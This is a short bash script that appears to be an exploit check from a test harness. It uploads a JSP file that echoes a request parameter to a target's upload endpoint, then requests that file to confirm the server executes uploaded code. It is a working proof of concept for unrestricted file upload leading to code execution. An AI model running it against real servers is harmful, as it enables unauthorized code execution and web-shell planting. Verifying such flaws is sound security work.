#!/usr/bin/env bash
set -euo pipefail
source "$(dirname "$0")/_lib.sh"
f="$(mktemp).jsp"
name="shell-$RANDOM.jsp"
trap 'curl -s -H "$VT" "$TARGET/api/_verify/cleanup-upload?name=$name" >/dev/null 2>&1 || true; rm -f "$f"' EXIT
printf '<%%= "JSP-SHELL-MARKER:" + request.getParameter("x") %%>' > "$f"
loc=$(curl -s -F "file=@$f;filename=$name" "$TARGET/upload")
curl -s "$TARGET$loc?x=ok" | grep -F 'JSP-SHELL-MARKER:ok'
